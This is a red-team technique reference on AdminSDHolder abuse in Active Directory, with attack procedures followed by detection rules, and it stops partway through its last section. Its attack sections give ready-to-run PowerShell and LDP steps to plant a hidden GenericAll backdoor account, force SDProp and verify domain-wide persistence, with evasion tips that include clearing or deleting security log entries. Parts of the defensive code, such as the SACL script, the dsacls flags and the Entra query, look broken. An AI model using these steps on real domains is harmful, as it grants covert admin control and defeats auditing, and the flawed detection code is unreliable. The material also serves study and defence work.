# [PERSIST-ACCT-001]: AdminSDHolder Abuse

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | PERSIST-ACCT-001 |
| **Technique Name** | AdminSDHolder Abuse |
| **MITRE ATT&CK v18.1** | [T1098 - Account Manipulation](https://attack.mitre.org/techniques/T1098/) |
| **Tactic** | Persistence (TA0003) |
| **Platforms** | Windows Active Directory |
| **Severity** | **CRITICAL** |
| **CVE** | N/A |
| **Technique Status** | **ACTIVE** – Verified working on Server 2016 through 2025 |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | Windows Server 2008 R2 – 2025 (all AD versions) |
| **Patched In** | Not patched – This is a feature, not a vulnerability. Defense depends on monitoring and access control. |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** AdminSDHolder is a critical Active Directory object (located at `CN=AdminSDHolder,CN=System,DC=DOMAIN,DC=LOCAL`) that serves as a security descriptor template for protecting highly privileged accounts and groups (Domain Admins, Enterprise Admins, Schema Admins, etc.). The Security Descriptor Propagation process (SDProp) runs every 60 minutes on the Primary Domain Controller Emulator (PDCE) and automatically reapplies the AdminSDHolder's ACL to all protected objects. An attacker with sufficient privileges can modify AdminSDHolder's ACL to grant themselves persistent administrative rights. Once modified, every time SDProp executes, the malicious permissions propagate to all protected objects—even if administrators detect and remove the attacker from privileged groups within that 60-minute window, SDProp will automatically restore the malicious ACE to protected accounts.

**Attack Surface:** The AdminSDHolder object itself, specifically its Discretionary Access Control List (DACL). Only Domain Admins or higher-privileged accounts can modify it under default configurations, making this a **post-compromise persistence technique** rather than an initial access vector.

**Business Impact:** **Undetectable persistent administrative access across the entire domain.** An attacker can regain full Domain Admin rights even if their primary compromised account is discovered and disabled. The attacker maintains a hidden backdoor that survives password resets, account disablement, and group membership removal for up to 60 minutes at a time. This enables data exfiltration, ransomware deployment, lateral movement to other forests, and long-term domain compromise.

**Technical Context:** Exploitation requires Domain Admin or equivalent privileges first. The actual backdoor installation takes < 1 minute (a single PowerShell command). However, the attacker must wait up to 60 minutes for SDProp to propagate changes automatically (unless they force SDProp to run, which requires admin access). Detection is difficult because changes to AdminSDHolder are legitimate administrative activities; distinguishing malicious modifications requires continuous ACL baseline comparison.

### Operational Risk
- **Execution Risk:** **MEDIUM** – Modifying AdminSDHolder is instantly logged (Event ID 5136/4780) if audit policies are enabled, but the actual compromise is not immediately apparent. The attacker must already be Domain Admin to execute this, so the risk is conditional on prior compromise.
- **Stealth:** **HIGH** – SDProp changes are expected administrative behavior; malicious ACLs blend into normal permission replication. Without a baseline, detecting unauthorized AdminSDHolder modifications is nearly impossible.
- **Reversibility:** **DIFFICULT** – Even if discovered, simply removing the attacker from a privileged group does NOT remove the persistent ACL from AdminSDHolder. The modified ACL must be manually reverted using PowerShell, LDIF, or LDP.exe. Until then, SDProp will continue reapplying it.

### Compliance Mappings
| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.2.3 | Restrict modification of AdminSDHolder and auditing of privileged group membership changes. |
| **DISA STIG** | WN19-AU-000160 | Ensure audit policy for "Directory Service Changes" is enabled (Event 5136). |
| **CISA SCuBA** | AC-6(2) | Least Privilege – Restrict Domain Admin accounts and enforce just-in-time (JIT) access. |
| **NIST 800-53** | AC-3, AC-6, AU-2 | Access Enforcement, Least Privilege, Audit Events (specifically directory modifications). |
| **GDPR** | Art. 32 | Security of Processing – Integrity and confidentiality of personal data (access controls). |
| **DORA** | Art. 9 | Protection and Prevention – Requires continuous monitoring and timely detection of privilege escalation. |
| **NIS2** | Art. 21(1)(c) | Cyber Risk Management – Access control and monitoring of administrative functions. |
| **ISO 27001** | A.9.2.1, A.9.2.3 | Management of Privileged Access Rights; restrict and monitor Administrative privileges. |
| **ISO 27005** | Risk Scenario | "Compromise of Administration Interface" – Direct attack on domain-level controls. |

---

## 3. TECHNICAL PREREQUISITES

- **Required Privileges:** **Domain Admin or equivalent** (Full Control ACL on AdminSDHolder object, or ability to modify DACL). Attacker must already have compromised a high-privilege account or exploited a privilege escalation (e.g., Kerberoasting, Token Impersonation, GPO Abuse, etc.).
- **Required Access:** Network access to the domain controller (LDAP, RPC). Local admin access is NOT required; this is entirely LDAP-based.
- **Required Tools:**
  - [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) (Version 3.0+) – For ACL modification
  - OR [ActiveDirectory PowerShell Module](https://docs.microsoft.com/en-us/powershell/module/activedirectory/) (built-in on Windows Server, available on Server 2008 R2+)
  - OR [LDAP utilities](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/ldp) (LDP.exe for GUI-based modification)
  - [BloodHound](https://github.com/BloodHoundAD/BloodHound) (optional, for reconnaissance of protected objects)

**Supported Versions:**
- **Windows:** Server 2008 R2, 2012, 2012 R2, 2016, 2019, 2022, 2025 (all versions support AdminSDHolder equally)
- **PowerShell:** Version 5.0+ (Windows Server 2016+), or PowerShell 3.0+ on older systems with ActiveDirectory module installed
- **LDAP:** Any version (LDAP is protocol-independent)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

#### Check AdminSDHolder Current Permissions (PowerShell)

```powershell
# Import ActiveDirectory module (already available on DC, must be installed on workstations)
Import-Module ActiveDirectory

# Get the current ACL on AdminSDHolder
$AdminSDHolderDN = "CN=AdminSDHolder,CN=System,DC=yourdomain,DC=local"
Get-ADObject -Identity $AdminSDHolderDN -Properties nTSecurityDescriptor |
  Select-Object -ExpandProperty nTSecurityDescriptor |
  Select-Object -ExpandProperty Access |
  Format-Table IdentityReference, ActiveDirectoryRights, AccessControlType -AutoSize
```

**What to Look For:**
- **Default ACL entries:** SYSTEM (Full Control), Administrators (Modify), Domain Admins (Read), Enterprise Admins (Read), Authenticated Users (Read)
- **Suspicious entries:** Any user SID or group with GenericAll, WriteDacl, WriteProperty, or similar extended rights that shouldn't be there (e.g., a backup user account, a service principal, or a newly created user)
- **Inherited entries:** By default, AdminSDHolder has inheritance disabled – inherited entries are suspicious

**Expected Output (Secure State):**
```
IdentityReference              ActiveDirectoryRights   AccessControlType
-----------------              ---------------------   -----------------
NT AUTHORITY\SYSTEM            FullControl             Allow
BUILTIN\Administrators         Modify                  Allow
DOMAIN\Domain Admins           ReadProperty, ExtendedRight Allow
DOMAIN\Enterprise Admins       ReadProperty, ExtendedRight Allow
NT AUTHORITY\Authenticated Users Read                  Allow
```

#### Alternative: Using PowerView (If Installed)

```powershell
# Download and load PowerView
Import-Module PowerView.ps1

# Check AdminSDHolder ACL
Get-DomainObjectAcl -SamAccountName "AdminSDHolder" -ResolveGUIDs |
  Format-Table IdentityReference, ActiveDirectoryRights, ObjectAceType
```

#### Check Which Objects Are Protected by AdminSDHolder

```powershell
# Find all objects with AdminCount=1 (these are protected)
Get-ADObject -LDAPFilter "(adminCount=1)" -Properties adminCount |
  Select-Object Name, DistinguishedName, ObjectClass |
  Format-Table -AutoSize
```

**What to Look For:**
- Should only include built-in admin groups (Domain Admins, Enterprise Admins, Schema Admins, etc.) and their members
- Any unusual user accounts or service accounts with adminCount=1 should be investigated
- Note the DNs of these protected objects – if AdminSDHolder's ACL is compromised, these objects will inherit the malicious permissions

**Version Note:** This command works identically on Server 2016 through 2025. No version-specific variations.

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Using PowerView (Impacket/Linux-Compatible)

**Supported Versions:** Server 2008 R2 – 2025 (Any AD version)

#### Step 1: Load PowerView and Identify Target

**Objective:** Import PowerView module and verify network connectivity to the domain.

**Command:**
```powershell
# From a Windows host with network access to DC
$VerbosePreference = "Continue"
Import-Module .\PowerView.ps1

# Verify domain connectivity
Get-Domain | Select-Object -Property Name, Forest, DomainControllers
```

**Expected Output:**
```
Name         Forest          DomainControllers
----         ------          -----------------
yourdomain   yourdomain.com  {dc1.yourdomain.local, dc2.yourdomain.local}
```

**What This Means:**
- PowerView has successfully enumerated the domain
- You have network connectivity to at least one domain controller
- The domain name is confirmed

**OpSec & Evasion:**
- Run PowerView from a compromised user account (not as Domain Admin initially, to avoid IAM alerts)
- Execute from a non-standard PowerShell host (e.g., PowerShell ISE, VS Code terminal, or a scheduled task)
- Avoid running PowerView from the DC itself – execute from a compromised workstation
- Detection likelihood: **MEDIUM** – PowerView enumeration generates LDAP queries that SOCs may flag. Run during high-volume LDAP activity if possible (e.g., morning login hours).

**Troubleshooting:**
- **Error:** `Import-Module : The specified module 'PowerView.ps1' was not found.`
  - **Cause:** PowerView script is not in the current directory or $PSModulePath
  - **Fix:** Download from [PowerSploit GitHub](https://github.com/PowerShellMafia/PowerSploit), save to the current directory, and run `Import-Module .\PowerView.ps1 -Force`
- **Error:** `Get-Domain : The term 'Get-Domain' is not recognized.`
  - **Cause:** PowerView did not import properly
  - **Fix:** Check for execution policy restrictions: `Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force` (for current process only)

**References & Proofs:**
- [PowerSploit GitHub](https://github.com/PowerShellMafia/PowerSploit)
- [PowerView Documentation](https://powersploit.readthedocs.io/en/latest/Recon/Get-Domain/)

#### Step 2: Identify Current User Privileges

**Objective:** Verify that the current user has sufficient privileges (Domain Admin) to modify AdminSDHolder.

**Command:**
```powershell
# Check if current user is a Domain Admin
$CurrentUser = [Security.Principal.WindowsIdentity]::GetCurrent().User
$AdminGroup = (Get-ADGroup -Identity "Domain Admins").SID

$User = Get-ADUser -Filter "SID -eq '$CurrentUser'" -Properties MemberOf
if ($User.MemberOf -like "*Domain Admins*") {
    Write-Host "✓ Current user is a Domain Admin – proceed with exploitation" -ForegroundColor Green
} else {
    Write-Host "✗ Current user does NOT have Domain Admin privileges" -ForegroundColor Red
}
```

**Expected Output (If Compromised):**
```
✓ Current user is a Domain Admin – proceed with exploitation
```

**What This Means:**
- You have verified that the current session has the necessary privileges
- If you see the red X, you must first escalate privileges (e.g., via Kerberoasting, Token Impersonation)

**OpSec & Evasion:**
- This check is minimal and generates only routine LDAP queries
- Detection likelihood: **LOW** – Group membership enumeration is common admin activity

**Troubleshooting:**
- **Error:** `Get-ADUser : Cannot find an object with identity`
  - **Cause:** ActiveDirectory module is not loaded
  - **Fix:** `Import-Module ActiveDirectory` first

**References & Proofs:**
- [Microsoft Learn: Get-ADUser](https://learn.microsoft.com/en-us/powershell/module/activedirectory/get-aduser)

#### Step 3: Add Malicious ACE to AdminSDHolder

**Objective:** Grant the attacker-controlled user full control (GenericAll) on the AdminSDHolder object. This ACE will be automatically propagated to all protected groups by SDProp.

**Command:**
```powershell
# Define target AdminSDHolder object
$AdminSDHolder = "CN=AdminSDHolder,CN=System,DC=yourdomain,DC=local"

# Define the principal to grant permissions (replace with attacker's username or a backdoor account)
$Principal = "yourdomain\backdoor_user"

# Method 1: Using PowerView (Recommended for stealth)
Add-DomainObjectAcl -TargetIdentity $AdminSDHolder -PrincipalIdentity $Principal -Rights All -Verbose

# This adds GenericAll rights, which effectively makes the principal a Domain Admin once SDProp runs
```

**Expected Output:**
```
VERBOSE: [Add-DomainObjectAcl] adding rights to object CN=AdminSDHolder,CN=System,DC=yourdomain,DC=local for principal yourdomain\backdoor_user
```

**What This Means:**
- The ACL modification has been submitted to the domain
- The change is immediately logged to the domain controller's event log (Event ID 5136)
- The attacker now has a persistent backdoor ACE in AdminSDHolder
- When SDProp runs (in up to 60 minutes), this permission will automatically propagate to Domain Admins, Enterprise Admins, and all other protected objects

**OpSec & Evasion:**
- The actual ACL modification is reversible – an admin can remove the attacker's ACE
- However, the event log entry (Event ID 5136) is permanent (unless logs are cleared)
- To hide this activity: Clear Security Event Log after exploitation or use tools like [WEvtUtil](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil) to delete Event 5136 entries (requires admin access to the DC)
- Timing: Perform during high-volume periods (morning logon hours, batch jobs running)
- Detection likelihood: **HIGH** – Modern SOCs monitor Event ID 5136 on critical objects like AdminSDHolder. Expect detection within 24 hours.

**Troubleshooting:**
- **Error:** `Add-DomainObjectAcl : Access Denied`
  - **Cause:** Current user is NOT a Domain Admin
  - **Fix:** First compromise a Domain Admin account or escalate privileges (Kerberoasting → ASPRep roasting → Token Impersonation)
- **Error:** `Add-DomainObjectAcl : Object not found`
  - **Cause:** Incorrect AdminSDHolder DN or domain suffix
  - **Fix:** Replace `yourdomain` with your actual domain name and `.local` with your FQDN suffix (e.g., `DC=company,DC=com`)

**References & Proofs:**
- [PowerView Add-DomainObjectAcl](https://powersploit.readthedocs.io/en/latest/Recon/Add-DomainObjectAcl/)
- [Sean Metcalf (@pyrotek3) – AdminSDHolder Leverage](https://adsecurity.org/?p=1906)

#### Step 4: Force SDProp to Run (Optional – Accelerate Propagation)

**Objective:** Trigger the Security Descriptor Propagation (SDProp) process immediately instead of waiting 60 minutes.

**Command (Using LDAP/RootDSE):**
```powershell
# Get the PDC Emulator
$PDC = (Get-ADDomain).PDCEmulator

# Connect to the RootDSE on the PDC
$RootDSE = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/RootDSE")

# Trigger the RunProtectAdminGroupsTask (SDProp)
$RootDSE.Put("RunProtectAdminGroupsTask", 1)
$RootDSE.CommitChanges()

Write-Host "✓ SDProp triggered on $PDC – changes will propagate within 1-5 minutes" -ForegroundColor Green
```

**Expected Output:**
```
✓ SDProp triggered on DC1.yourdomain.local – changes will propagate within 1-5 minutes
```

**What This Means:**
- The PDC Emulator has received the command to run SDProp immediately
- The modified AdminSDHolder ACL will be propagated to all protected objects within 1-5 minutes
- Once complete, the attacker will have full control over all Domain Admins, Enterprise Admins, and other protected accounts

**OpSec & Evasion:**
- Forcing SDProp generates an additional LDAP modification (Event ID 5136 on the PDC)
- This is a red flag for SOCs – avoid forcing SDProp if possible; waiting 60 minutes is more stealthy
- If you do force SDProp, do it immediately after modifying AdminSDHolder (within seconds) to avoid a time gap that reveals your intent
- Detection likelihood: **CRITICAL** – Forcing SDProp is highly suspicious and should trigger immediate investigation

**Alternative (Stealth): Wait 60 Minutes**
```powershell
# Just wait – SDProp will run automatically on its scheduled interval
# Monitor for Event ID 4780 on the PDC to confirm propagation
```

**Troubleshooting:**
- **Error:** `RootDSE.Put : Object reference not set to an instance of an object`
  - **Cause:** Unable to connect to the PDC or LDAP service is not available
  - **Fix:** Verify PDC hostname and network connectivity: `ping $PDC`
- **Error:** `CommitChanges : Access Denied`
  - **Cause:** Current user does NOT have permission to modify RootDSE (requires Domain Admin)
  - **Fix:** Escalate privileges before attempting to force SDProp

**References & Proofs:**
- [Microsoft Learn: Triggering SDProp Manually](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory#running-sdprop-manually)
- [Semperis: SDProp Documentation](https://www.semperis.com/resources/improving-your-active-directory-security-posture-adminsdholderto-the-rescue/)

#### Step 5: Verify Persistent Access (Post-SDProp)

**Objective:** Confirm that the malicious ACE has been propagated to protected objects (proof of successful exploitation).

**Command:**
```powershell
# Wait for SDProp to complete (60 minutes, or force it per Step 4)
# Then verify the backdoor user's permissions on Domain Admins group

$DomainAdminsGroup = Get-ADGroup -Identity "Domain Admins"
$DomainAdminsACL = Get-ACL "AD:\$($DomainAdminsGroup.DistinguishedName)"

# Check if the backdoor user has rights on Domain Admins
$BackdoorUser = Get-ADUser -Identity "backdoor_user"
$BackdoorUserPermissions = $DomainAdminsACL.Access | Where-Object { 
    $_.IdentityReference -like "*backdoor_user*" 
}

if ($BackdoorUserPermissions) {
    Write-Host "✓ PERSISTENCE CONFIRMED: backdoor_user has the following rights on Domain Admins:" -ForegroundColor Green
    $BackdoorUserPermissions | Select-Object IdentityReference, ActiveDirectoryRights, AccessControlType
} else {
    Write-Host "✗ Persistence not yet confirmed – SDProp may not have completed" -ForegroundColor Red
}
```

**Expected Output (If Successful):**
```
✓ PERSISTENCE CONFIRMED: backdoor_user has the following rights on Domain Admins:

IdentityReference          ActiveDirectoryRights                    AccessControlType
-----------------          ---------------------                    -----------------
DOMAIN\backdoor_user       GenericAll                               Allow
```

**What This Means:**
- The malicious ACE has been successfully propagated to the Domain Admins group
- The backdoor_user now has full control over Domain Admins and can add themselves to the group
- Even if the original compromised Domain Admin account is disabled, the backdoor_user will retain administrative access
- The attack is complete and persistent

**OpSec & Evasion:**
- This verification step generates no additional suspicious events (just ACL reads)
- However, running this command repeatedly may trigger "unusual ACL enumeration" alerts
- Detection likelihood: **LOW** (for single run), **HIGH** (if run repeatedly)

**Troubleshooting:**
- **Error:** `Get-ADUser : Cannot find an object with identity 'backdoor_user'`
  - **Cause:** The user account doesn't exist yet, or a different username was used in Step 3
  - **Fix:** Use the actual username that was specified in the `Add-DomainObjectAcl` command

**References & Proofs:**
- [Microsoft Learn: Get-ACL (AD)](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/get-acl)

---

### METHOD 2: Using Native Active Directory Cmdlets (Built-in Module)

**Supported Versions:** Server 2008 R2 – 2025 (all with ActiveDirectory module)

#### Step 1: Import ActiveDirectory Module

```powershell
Import-Module ActiveDirectory
```

#### Step 2: Create or Identify Backdoor Account

```powershell
# Option A: Create a new hidden service account (if not already created)
$AccountName = "SVC_Maintenance"
$Password = ConvertTo-SecureString "SuperComplexPassword123!" -AsPlainText -Force

New-ADUser -Name $AccountName `
  -SamAccountName $AccountName `
  -UserPrincipalName "$AccountName@yourdomain.com" `
  -AccountPassword $Password `
  -Enabled $false  # Keep disabled to avoid detection
  -Description "System maintenance account"

Write-Host "✓ Backdoor account created: $AccountName (disabled by default)"

# Option B: Use an existing service account (if already compromised)
$AccountName = "SVC_ADConnect"  # Use an existing account
```

#### Step 3: Get AdminSDHolder and Modify ACL

```powershell
# Get AdminSDHolder object
$AdminSDHolderPath = "AD:CN=AdminSDHolder,CN=System,DC=yourdomain,DC=local"
$AdminSDHolderACL = Get-ACL $AdminSDHolderPath

# Get the SID of the backdoor account
$BackdoorUser = Get-ADUser -Identity $AccountName
$BackdoorSID = $BackdoorUser.SID

# Create a new ACE granting GenericAll (full control) to the backdoor account
$GenericAllGUID = [guid]'00000000-0000-0000-0000-000000000000'  # Applies to all properties
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
    $BackdoorSID,
    "GenericAll",
    "Allow",
    $GenericAllGUID,
    "All"
)

# Add the ACE to the ACL
$AdminSDHolderACL.AddAccessRule($ACE)

# Apply the modified ACL
Set-ACL -Path $AdminSDHolderPath -AclObject $AdminSDHolderACL

Write-Host "✓ Malicious ACE added to AdminSDHolder. SDProp will propagate in ~60 minutes." -ForegroundColor Green
```

**Expected Output:**
```
✓ Malicious ACE added to AdminSDHolder. SDProp will propagate in ~60 minutes.
```

**What This Means:**
- The backdoor account now has GenericAll permissions on AdminSDHolder
- Upon next SDProp execution, this permission will be copied to all protected groups
- The backdoor account will gain effective Domain Admin access

#### Step 4: Verify Persistence (Same as Method 1, Step 5)

---

### METHOD 3: Using LDP.exe (GUI-Based, For Manual/Testing Purposes)

**Supported Versions:** All Windows versions with LDP.exe installed (usually on Windows Server or from RSAT tools)

#### Step 1: Launch LDP.exe

```cmd
ldp.exe
```

#### Step 2: Connect to Domain Controller

1. Click **Connection** → **Connect**
2. Enter the **Server** name (e.g., `dc1.yourdomain.local`)
3. Enter the **Port** (389 for standard LDAP)
4. Click **OK**

#### Step 3: Bind with Domain Admin Credentials

1. Click **Connection** → **Bind**
2. Select **Bind with credentials**
3. Enter username (e.g., `yourdomain\admin`) and password
4. Click **OK**

#### Step 4: Navigate to AdminSDHolder

1. Click **View** → **Tree**
2. Base DN: **CN=AdminSDHolder,CN=System,DC=yourdomain,DC=local**
3. Find **AdminSDHolder** in the tree
4. Right-click and select **Modify**

#### Step 5: Add Malicious ACE

1. In the attribute editor, locate **nTSecurityDescriptor**
2. Click **Edit** (this opens the security descriptor editor)
3. Add a new ACE for your backdoor account with **GenericAll** rights
4. Click **OK** and **Run**

#### Step 6: Trigger SDProp

1. Click **Utilities** → **RootDSE** (or click on **RootDSE** in the tree)
2. Click **Edit**
3. Add an attribute: **Name = `RunProtectAdminGroupsTask`, Value = `1`**
4. Click **Run**

---

## 6. ATTACK SIMULATION & VERIFICATION

### Atomic Red Team (Minimal Support)

- **Test ID:** T1098 – Account Manipulation (general test)
- **Specific AdminSDHolder Test:** Not a dedicated Atomic test yet; the general T1098 tests focus on account creation and group membership modification rather than ACL manipulation
- **Reference:** [Atomic Red Team T1098](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1098/T1098.md)

**Alternative: Use the exploitation commands in Method 1 directly as a simulation**

---

## 7. TOOLS & COMMANDS REFERENCE

### PowerView (Add-DomainObjectAcl)

**URL:** [PowerSploit GitHub](https://github.com/PowerShellMafia/PowerSploit)  
**Version:** 3.0+ (current as of 2025)  
**Minimum Version:** 3.0  
**Supported Platforms:** Windows (PowerShell 5.0+)

**Installation:**
```powershell
# Download from GitHub
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1" -OutFile "PowerView.ps1"

# Import
Import-Module .\PowerView.ps1
```

**Usage:**
```powershell
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=yourdomain,DC=local" `
  -PrincipalIdentity "attacker_user" `
  -Rights All -Verbose
```

### ActiveDirectory PowerShell Module

**URL:** [Microsoft Learn - ActiveDirectory Module](https://learn.microsoft.com/en-us/powershell/module/activedirectory/)  
**Version:** Built-in on Windows Server 2008 R2+  
**Installation:** `Add-WindowsFeature RSAT-AD-PowerShell` (Server) or Windows RSAT tools (Client)

**Key Cmdlets:**
- `Get-ADUser, Get-ADGroup, Get-ADObject`
- `Get-ACL, Set-ACL`
- `New-ADUser, New-ADGroup`

### LDP.exe (Lightweight Directory Access Protocol Editor)

**URL:** Built-in on Windows Server or via RSAT  
**Version:** OS-dependent (no separate version)

**Usage:** GUI-based LDAP editor for modifying directory service objects directly

---

## 8. SPLUNK DETECTION RULES

### Rule 1: AdminSDHolder ACL Modification

**Rule Configuration:**
- **Required Index:** `wineventlog` (or forwarded Security event index)
- **Required Sourcetype:** `WinEventLog:Security`
- **Required Fields:** `EventCode`, `ObjectDN`
- **Alert Threshold:** 1 or more events (any modification to AdminSDHolder is suspicious)
- **Applies To Versions:** All Windows Server versions

**SPL Query:**
```
index=wineventlog sourcetype="WinEventLog:Security" EventCode=5136
  ObjectDN="CN=AdminSDHolder,CN=System*"
| stats count by User, Computer, ObjectDN, AttributeValue
| where count > 0
```

**What This Detects:**
- **EventCode 5136** = "A directory service object was modified"
- **ObjectDN** filter = Only modifications to the AdminSDHolder object
- **User** field = Who made the change (should only be SYSTEM or Domain Admins during legitimate operations)
- **AttributeValue** = The actual attribute that was changed (should be blank/empty for unauthorized changes)

**Manual Configuration Steps:**
1. Log into **Splunk Web**
2. Click **Search & Reporting** → **New Alert**
3. Paste the SPL query above
4. Click **Save As** → **Alert**
5. Set **Trigger Condition** to `Alert when number of events is greater than 0`
6. Configure **Alert Actions** → **Add Action** → **Send Email** to SOC team
7. Set **Schedule** to run **every 1 hour** (or more frequently)
8. Click **Save**

**False Positive Analysis:**
- **Legitimate Activity:** Authorized administrators using PowerShell DSC (Desired State Configuration) to baseline permissions; Active Directory auditing tools performing automated compliance checks
- **Benign Tools:** Microsoft's built-in group policy application tools, Semperis DirectoryClone, third-party AD compliance scanners
- **Tuning:** Whitelist known administrative accounts and security tools: `User NOT IN ("SYSTEM", "NT AUTHORITY\NETWORK SERVICE", "svc_audit_tool")`

---

## 9. MICROSOFT SENTINEL DETECTION

### Query 1: AdminSDHolder Modifications in Azure AD/Entra

**Rule Configuration:**
- **Required Table:** `AuditLogs` (Azure AD audit log)
- **Required Fields:** `OperationName`, `TargetResources`, `InitiatedBy`
- **Alert Severity:** **Critical**
- **Frequency:** Run every **1 hour**
- **Applies To Versions:** Azure AD (cloud-only, hybrid environments)

**KQL Query:**
```kusto
AuditLogs
| where OperationName contains "Modify" or OperationName contains "Add" 
| where TargetResources[0].displayName == "AdminSDHolder" or TargetResources[0].id contains "AdminSDHolder"
| extend InitiatedByUser = InitiatedBy.user.userPrincipalName
| extend TargetObject = TargetResources[0].displayName
| project TimeGenerated, OperationName, InitiatedByUser, TargetObject, Result
| sort by TimeGenerated desc
```

**What This Detects:**
- Modifications to any object named "AdminSDHolder"
- The user who initiated the change (InitiatedByUser)
- The operation type (Add, Modify, Delete)
- Timestamp of the change

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select your workspace → **Analytics** → **Create** → **Scheduled query rule**
3. **General Tab:**
   - Name: `AdminSDHolder Modification Detection`
   - Description: `Alerts when AdminSDHolder ACL is modified`
   - Severity: `Critical`
4. **Set rule logic Tab:**
   - Copy the KQL query above
   - Run query every: `1 hour`
   - Lookup data from the last: `1 hour`
5. **Incident settings Tab:**
   - **Create incidents** = Enabled
   - **Group related alerts** = By Alert name
6. Click **Review + create** → **Create**

**Manual Configuration Steps (PowerShell - Sentinel Module):**
```powershell
# Connect to Azure
Connect-AzAccount

# Get workspace
$ResourceGroup = "YourResourceGroup"
$WorkspaceName = "YourSentinelWorkspace"

# Create the rule
New-AzSentinelAlertRule -ResourceGroupName $ResourceGroup `
  -WorkspaceName $WorkspaceName `
  -DisplayName "AdminSDHolder Modification Detection" `
  -Severity Critical `
  -Query @"
AuditLogs
| where OperationName contains "Modify" or OperationName contains "Add"
| where TargetResources[0].displayName == "AdminSDHolder"
| extend InitiatedByUser = InitiatedBy.user.userPrincipalName
| project TimeGenerated, OperationName, InitiatedByUser
"@
```

**Source:** [Microsoft Sentinel GitHub - AdminSDHolder Rules](https://github.com/Azure/Azure-Sentinel/search?q=AdminSDHolder)

---

## 10. WINDOWS EVENT LOG MONITORING

### Event ID 5136: Directory Service Object Modified

- **Log Source:** Security (on the Primary Domain Controller)
- **Trigger:** Any modification to an AD object with SACL audit enabled
- **Filter (for AdminSDHolder specifically):** `ObjectDN contains "CN=AdminSDHolder"`
- **Applies To Versions:** All Windows Server versions (2008 R2+)

**Manual Configuration Steps (Group Policy):**
1. Open **Group Policy Management Console** (`gpmc.msc`)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **Audit Policies** → **DS Access**
3. Enable **Audit Directory Service Changes**: Set to **Success and Failure**
4. Click **Apply** → **OK**
5. Run `gpupdate /force` on all domain controllers

**Manual Configuration Steps (Modify AdminSDHolder SACL Directly):**
```powershell
# Add SACL entry to AdminSDHolder for auditing all modifications
$AdminSDHolder = Get-ADObject -Identity "CN=AdminSDHolder,CN=System,DC=yourdomain,DC=local"
$AdminSDHolderPath = "AD:\$($AdminSDHolder.DistinguishedName)"

# Get current security descriptor
$SD = Get-ACL -Path $AdminSDHolderPath

# Add a SACL entry to audit all modifications
$SACL = New-Object System.DirectoryServices.ActiveDirectoryAuditRule(
    "Everyone",
    "AuditFlags" = [System.Security.AccessControl.AuditFlags]::All,
    "ObjectAceType" = [guid]'00000000-0000-0000-0000-000000000000'
)

# Note: This requires modifying the SACL (System Access Control List)
# More commonly done via LDP.exe or DSACLS tool

# Alternative using command line:
dsacls "CN=AdminSDHolder,CN=System,DC=yourdomain,DC=local" /G:Everyone:SACL /inheritance:e
```

### Event ID 4780: ACL was set on accounts which are members of administrators groups

- **Log Source:** Security (on the Primary Domain Controller)
- **Trigger:** SDProp propagates AdminSDHolder permissions to protected objects
- **Filter:** `TaskCategory = "User Account Management" AND EventID = 4780`
- **Applies To Versions:** All Windows Server versions

**What to Look For:**
- Frequency of 4780 events (should only occur once per protected object when first added to admin groups)
- Multiple 4780 events in rapid succession = Possible AdminSDHolder modification attack (SDProp re-stamping all protected objects)
- User associated with the 4780 = Always "ANONYMOUS LOGON" (this is normal; the system itself is applying the changes)

**Manual Configuration Steps:**
The 4780 event is automatically logged if:
1. Advanced Audit Policy: **Audit User Account Management** = Enabled
2. AdminSDHolder monitoring is active

To force logging:
```powershell
# In Group Policy: Computer Configuration > Policies > Windows Settings > Security Settings > Advanced Audit Policy Configuration > Account Management
# Enable: "Audit User Account Management" = Success
```

---

## 11. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 10.0+

Sysmon is less useful for LDAP-based attacks like AdminSDHolder abuse (it primarily monitors process and file system activity). However, if an attacker uses PowerShell to execute the backdoor commands, Sysmon can detect the PowerShell process and command-line arguments.

**Sysmon Config (Detect PowerShell with Add-DomainObjectAcl):**
```xml
<Sysmon schemaversion="4.70">
  <EventFiltering>
    <!-- Capture Process Creation for PowerShell -->
    <ProcessCreate onmatch="include">
      <ParentImage condition="image">powershell.exe</ParentImage>
      <CommandLine condition="contains any">
        Add-DomainObjectAcl;
        Add-ObjectAcl;
        Set-ACL;
        AdminSDHolder
      </CommandLine>
    </ProcessCreate>
  </EventFiltering>
</Sysmon>
```

**Manual Configuration Steps:**
1. Download Sysmon from [Microsoft Sysinternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon)
2. Create a config file `sysmon-config.xml` with the XML above
3. Install: `sysmon64.exe -accepteula -i sysmon-config.xml`
4. Verify: `Get-Service Sysmon64`
5. Check logs: `Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10`

---

## 12. MICROSOFT DEFENDER FOR CLOUD

### Detection Alert: Suspicious Modification of Active Directory

**Alert Name:** `Suspicious modification of the AdminSDHolder's ACL`  
**Severity:** **Critical**  
**Description:** Alerts when AdminSDHolder object is modified by any user other than SYSTEM or during scheduled maintenance windows  
**Applies To:** All subscriptions with **Defender for Servers** and **Defender for Identity** enabled

**Manual Configuration Steps (Enable Defender for Cloud):**
